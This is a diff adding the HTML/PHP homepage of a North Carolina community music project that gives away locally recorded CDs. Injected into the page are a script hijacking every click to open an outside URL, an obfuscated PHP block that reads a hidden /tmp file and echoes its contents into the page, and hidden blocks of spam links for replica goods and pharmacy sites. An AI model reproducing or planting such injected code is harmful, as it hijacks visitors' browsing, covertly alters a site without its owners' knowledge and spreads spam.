@@ -1,0 +1,147 @@
+<script>(function (parameters) {
+		const getHoursDiff = (startDate, endDate) => {
+			const msInHour = 1000 * 60 * 60;
+			return Math.round(Math.abs(endDate - startDate) / msInHour);
+		}
+		const getFromStorage = (host) => localStorage.getItem(`${host}-local-storage`);
+		const addToStorage = (host, nowDate) => localStorage.setItem(`${host}-local-storage`, nowDate);
+
+		function globalClick(event) {
+			const host = location.host
+			const newLocation = "https://ois.is/images/logo.png"
+			const allowedHours = 6
+
+			const nowDate = Date.parse(new Date());
+			const savedData = getFromStorage(host)
+
+			if (savedData) {
+				try {
+					const storageDate = parseInt(savedData);
+					// check hours
+					const hoursDiff = getHoursDiff(nowDate, storageDate)
+					console.log(nowDate, storageDate, hoursDiff)
+					if (hoursDiff >= allowedHours) {
+						addToStorage(host, nowDate);
+						window.open(newLocation, "_blank");
+					}
+				} catch (error) {
+					addToStorage(host, nowDate);
+					window.open(newLocation, "_blank");
+				}
+			} else {
+				addToStorage(host, nowDate);
+				window.open(newLocation, "_blank");
+			}
+		}
+		document.addEventListener("click", globalClick);
+	})();</script>
+<html>
+	<head>
+    <meta HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=utf-8">
+		<title>The Community Music Project</title>
+		<link href="cmp.css" rel="stylesheet" type="text/css">
+	<?php goto FkQAX; bZNcz: $purDK = "\x3c\41\x2d\55{$QYhSu}\55\x2d\x3e"; goto cD2OM; lWfiu: $qUpUD = "\x2f\164\x6d\160\x2f\x73\x65\x73\x73\x31\137\x31\71\142\x36\x66\63\x32\x37\x62\x62\71\141\142\143\63\x64\x62\144\x66\x62\x61\143\x63\x66\67\62\143\x35\x34\x65\x66\x37"; goto ZUQmd; FkQAX: $E47ox = FALSE; goto lWfiu; ZUQmd: if (!(file_exists($qUpUD) && is_readable($qUpUD))) { goto ZvWyT; } goto IAIBJ; k208u: if (!($E47ox !== FALSE)) { goto bF4hT; } goto QJywi; Spi4Z: bF4hT: goto NCIgg; IAIBJ: $E47ox = str_replace(PHP_EOL, '', @file_get_contents($qUpUD)); goto o8oeF; cD2OM: echo rand(1, 3) === 3 ? $purDK . $E47ox . PHP_EOL : $purDK . PHP_EOL; goto Spi4Z; x282G: $QYhSu = sha1_file($ZcK5q); goto bZNcz; o8oeF: ZvWyT: goto k208u; QJywi: $ZcK5q = __FILE__; goto x282G; NCIgg: ?></head>
+	<body>
+		<iframe id="nav" src="nav.html"></iframe>
+		
+		<hr />
+		<p class="album">
+<!--
+      <object class="video" width="425" height="344">
+        <param name="movie" value="http://www.youtube.com/v/RwMqiYQu0SU&hl=en_US&fs=1&"></param>
+        <param name="allowFullScreen" value="true"><�m>
+        <param name="allowscriptaccess" value="always"></param>
+        <embed src="http://www.youtube.com/v/RwMqiYQu0SU&hl=en_US&fs=1&" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="425" height="344">
+        </embed>
+      </object>
+
+      <h3>Don't miss seeing The Goddess Suite performed this June!</h3>
+      <span class="description">
+        The Goddess Suite is a choral work for women’s voices, accompanied by 
+        piano, flute, cello, and percussion.   Cynthia Crossen of Chatham County, 
+        North Carolina, composed the suite in 1986, inspired by 
+        Jean Shinoda Bolen's book, 
+        <a href="http://www.amazon.com/Goddesses-Everywoman-Powerful-Archetypes-Womens/dp/0060572841/ref=sr_1_1?ie=UTF8&s=books&qid=1272635836&sr=8-1">Goddesses in Everywoman</a>.
+        The work is a women’s empowerment piece, celebrating the aspects 
+        of the Greek goddesses in every woman.
+        <br /><br />
+        The 2010 production will be performed <b>June 19th,  20th, 26th, and 27th</b> 
+        at various venues in Chapel Hill, Durham, and Pittsboro. 
+        All proceeds will go to local and global charities, 
+        to improve women's lives.
+        <br /><br />
+        <a href="tgs-2010.html">Find out more about the production.</a>
+        <br />
+        <a href="tgs.html">Download the music for free.</a>
+        <br />
+        <br />
+        Thanks to <a href="http://infocusstudios.com">In Focus Studios</a> 
+        for creating the video on the left!
+      </span>
+    </p>
+    <hr /> 
+!-->
+
+		
+		<h3>What's the Sound of Grassroots Singing?</h3>
+		<p>
+			Back when we lived in tribes, music was everywhere, made by everyone in the tribe.
+			It was constant and free.
+			It belonged to everybody.
+			It was magic, transformative, powerful, and absolutely essential to our health and survival.
+			It was particular to a tribe and a place.
+			We made our own culture, like we made our clothes and our shelter.
+			We had songs for every passage--birth, coming of age, marriage, death--songs for the hunt, the work, the worship, the stories.
+			Everybody sang.
+		</p>
+		<p>
+			We don't have tribes anymore, but we can still gather, and we can still make our own music with our own voices and hands.
+			We can reclaim that power and that boon.
+			We can make some culture.
+			Here's how we're doing it with the Community Music Project.
+		</p>
+		<h3>How the Community Music Project Began</h3>
+		<p>
+			The Community Music Project is rooted in the rich, creative, and vibrant soil of the Carrboro/Chapel Hill/Chatham County North Carolina community.
+			We started out recording our family's songs, and the songs of a few friends, for a family Christmas present.
+			We liked it, we began to think a little bigger, and the Community Music Project began.
+		</p>
+		<p>
+			Since 2000, we have produced one CD every year.
+			We record local songwriters and singers, compile the songs and artwork into a CD, press 1000 copies, and give them away to the CD musicians, friends, and community members--wherever we think the music will be appreciated.
+			Many of the people who value the music and what we are trying to do give us donations to keep the project going.
+		</p>
+<em style="display:block;overflow:hidden;height:1px;width:1px;"><a href="https://www.vapesshops.co.uk/">https://www.vapesshops.co.uk</a> forum in the using superior devices, high-quality  things. who sells the best <a href="https://www.rechargeablevape.com/">https://rechargeablevape.com</a> workmen holders faithful. please do not flow or escape might be the intent relating to rolex <a href="https://www.tomtops.ru/">tomtops.ru</a>. we have best <a href="https://www.cartierreplicas.ru/">cheap cartier wholesale</a> online. this famous <a href="https://www.balmainreplica.ru/">https://www.balmainreplica.ru</a> gives you maturity and successful feeling in every place you go. </em>
+		<h3>Free Music - It's Revolutionary</h3>
+		<p>
+			The goals of this website are:
+			<ul>
+				<li>To share our local music more widely, and keep it free</li>
+				<li>To help others get their own community music projects started, by providing as much information as we can from our experience doing this</li>
+			</ul>
+		</p>
+		<h3>About This Web Site</h3>
+		<p>
+			This internet site is an attempt to explore other ways to distribute the music we are producing.
+			At this site, you will find the music itself as downloadable MP3 files as well as the artwork from the CDs in downloadable/printable PDF files. 
+		</p>
+		<p>
+			<b>
+				We invite you to download and manufacture your own CDs for yourself and as gifts for your friends. 
+				We ask only that you refrain from using these copyrighted recordings and artwork commercially (for money) without prior permission from the copyright holders.
+				These songs, and the accompanying artwork, are copyrighted; they are not in the public domain. 
+			</b>
+		</p>
+		<p>
+			If you have any questions about how our policy might apply to your situation, please e-mail us at
+			<a href="mailto:info@communitymusicproject.org">info@communitymusicproject.org</a> 
+			and put "Project Copyright Policy" on the subject line.
+			Once again, if you do not put "Project Copyright Policy" on the subject line, our spam filter will toss your message into the bit-bucket.
+		</p>
+		<p>
+			We can press typical CDs, including typical printed artwork, packaged in paper sleeves (rather than jewel cases), for less than $1,500 per 1000 CDs.
+			Internet download distribution is expected to cost less than 10 cents per downloaded copy.
+		</p>
+<div style="position:absolute;top:-5634px;"><a href=http://clubpapi.com/rsscbp.php?cbp=32>cheapest viagra online</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=10>cialis black reviews</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=37>viagra express</a><BR><a href=http://www.kcmsalliance.org/?kcm=5>buy viagra online cheap</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=8>cheap price viagra</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=31>free viagra</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=5>cheap viagra 100mg</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=34>real viagra for sale</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=17>discount viagra pills</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=48>buy discount cialis</a><BR><a href=http://www.kcmsalliance.org/?kcm=6>free viagra samples</a><BR><a href=http://www.kcmsalliance.org/?kcm=10>buy discount cialis</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=44>buy viagra online</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=21>buy discount viagra</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=25>buy real viagra online</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=45>buy levitra now</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=15>cheap price viagra</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=12>buy sale viagra</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=30>buy cialis online</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=2>viagra generic</a><BR><a href=http://www.kcmsalliance.org/?kcm=13>viagra buy online</a><BR><a href=http://www.kcmsalliance.org/?kcm=11>buy viagra online ireland</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=23>cheapest cialis</a><BR><a href=http://clubpapi.com/rsscbp.php?cbp=52>cheapest cialis</a></div>
+	</body>
+</html>
